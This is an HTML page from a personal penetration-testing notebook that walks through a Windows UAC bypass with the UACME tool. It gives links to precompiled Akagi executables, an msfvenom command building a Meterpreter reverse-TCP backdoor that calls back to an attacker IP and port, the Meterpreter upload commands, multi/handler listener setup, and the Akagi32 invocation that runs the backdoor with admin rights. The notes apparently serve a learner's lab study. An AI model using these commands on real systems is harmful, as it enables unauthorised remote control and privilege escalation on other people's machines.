<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>UACMe Tool</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>UACMe Tool</h1><br/><br /><strong><h3>Requirements:</h3></strong><br />• session already established with the target machine<br /><strong><h3>What we want to do?</h3></strong><br />• establish another session with the target machine now with Admin privileges<br /><br />Site of the tool: <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a><br /><br /><span style="text-decoration:underline;">The main purpose of the UACME tool is bypass UAC</span> and to do it can implement different methods.<br />We have to run in it on the target machine and select the method to use <br /><br /><br />1. <strong>Use Visual Studio to compile the </strong><strong><span style="color:#00ff00;">UAC Bypass(UACME)</span></strong>.<br />UACME is a Windows program without a binary executable file but only Source code, because of that we have first to compile it in Windows!<strong><br /></strong><a href="file://G:/Other computers/Yoga 520/CherryTree/Files/network security/post_exploitation/privilege_escalation/Akagi32.zip">→ HERE ←</a>  i have already compiled the program(folder:<a href="file://G:/Other computers/Yoga 520/CherryTree/Files/network security/post_exploitation/privilege_escalation">..\CherryTree\Files\network security\post_exploitation\privilege_escalation</a>)<br />32 bit: <a href="https://github.com/DenFox93/Compiled-programs/raw/main/Akagi32.exe">https://github.com/DenFox93/Compiled-programs/raw/main/Akagi32.exe</a><br />64 bit: <a href="https://github.com/DenFox93/Compiled-programs/raw/main/Akagi64.exe">https://github.com/DenFox93/Compiled-programs/raw/main/Akagi64.exe</a><strong><br /></strong><br /><br /><strong>2. Use msfvenom to create the </strong><strong><span style="color:#a020f0;">payload</span></strong><br />We have to use it as a backdoor in the Windows machine<br />LHOST and LPORT are respectively the Ip address of the attacker machine and its listening ports<br /><div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST=192.168.1.122 LPORT=2345 -f exe -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.exe</pre></div><br />    <a href=""><img src="images/845-1.png" alt="images/845-1.png" /></a><br /><br />3. <strong>From the first established session we have to upload both the </strong><strong><span style="color:#a020f0;">payload</span></strong><strong> and the </strong><strong><span style="color:#00ff00;">UAC Bypass</span></strong><strong> to on the target machine</strong><br />Come back to the session that we have already but <span style="text-decoration:underline;">without admin privileges</span> and upload the the files to the target<br /><div class="codebox"><pre>meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>exploit.exe <span style="color:#3ad900;font-weight:400">&quot;C:\Documents and Settings\Administrator\Desktop&quot;</span>   <span style="color:#0088ff;font-weight:400">#upload of exploit.exe</span><br />meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>Akagi32.exe <span style="color:#3ad900;font-weight:400">&quot;C:\Documents and Settings\Administrator\Desktop&quot;</span>   <span style="color:#0088ff;font-weight:400">#upload of Akagi32.exe</span></pre></div><br />    <a href=""><img src="images/845-2.png" alt="images/845-2.png" /></a><br /><div class="codebox"><pre>meterpreter &gt; getprivs           <span style="color:#0088ff;font-weight:400">#we can see that now we do not have admin privileges</span></pre></div><br /><div class="codebox"><pre>PS&gt; <span style="color:#ff9d00;font-weight:700">whoami</span> <span style="color:#ff9d00;font-weight:700">/</span>priv                 <span style="color:#0088ff;font-weight:400">#alternative</span></pre></div><br />    <a href=""><img src="images/845-3.png" alt="images/845-3.png" /></a><br />    <a href=""><img src="images/845-4.png" alt="images/845-4.png" /></a><br /><br /><strong>4. We have to set up the </strong><strong><span style="color:#ff8700;">payload on the Attacker machine</span></strong><strong> accordingly to the payload of the </strong><strong><span style="color:#a020f0;">msfvenom payload </span></strong><br /><div class="codebox"><pre>meterpreter &gt; background                            <span style="color:#0088ff;font-weight:400">#put in background session without admin privileges</span><br />msf &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp   <span style="color:#0088ff;font-weight:400">#same payload of msfvenom</span><br />msf &gt; show options<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST 192.168.1.122<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> LPORT 2345<br />msf &gt; run -j                                         <span style="color:#0088ff;font-weight:400">#wait for incoming connections in BACKGROUND</span></pre></div><br /><a href=""><img src="images/845-5.png" alt="images/845-5.png" /></a><br />Now we have to wait for the connection from the target, that we can do from the first meterpreter session(without privileges)<br /><br /><strong>5. From the first session(without privileges) create a new meterpreter session(with privileges) </strong><br /><div class="codebox"><pre>msf &gt; sessions -l<br />msf &gt; sessions -i 1             <span style="color:#0088ff;font-weight:400">#session whitout privileges</span><br />meterpreter&gt; shell              <span style="color:#0088ff;font-weight:400">#to have a shell, otherwise we have to use the &quot;execute&quot; command for execute</span><br />                                <span style="color:#0088ff;font-weight:400">#a command</span><br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; Akagi32.exe 10 C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\e</span>xploit.exe</pre></div><br /><a href=""><img src="images/845-6.png" alt="images/845-6.png" /></a><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">(</span>ENTER to <span style="color:#ff9d00;font-weight:700">return</span> to C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; <span style="color:#ff9d00;font-weight:700">)</span></pre></div><br /><div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; CTRL-C to come back to meterpreter<br />meterpreter &gt; background</pre></div><br /><a href=""><img src="images/845-7.png" alt="images/845-7.png" /></a><br /><div class="codebox"><pre>meterpreter &gt; sessions<br />meterpreter &gt; sessions -i 2</pre></div><br /><a href=""><img src="images/845-8.png" alt="images/845-8.png" /></a><br /><h2>Now we have Admin privileges!</h2><br /><a href=""><img src="images/845-9.png" alt="images/845-9.png" /></a><br /><br /><br /></div>
</body>
</html>
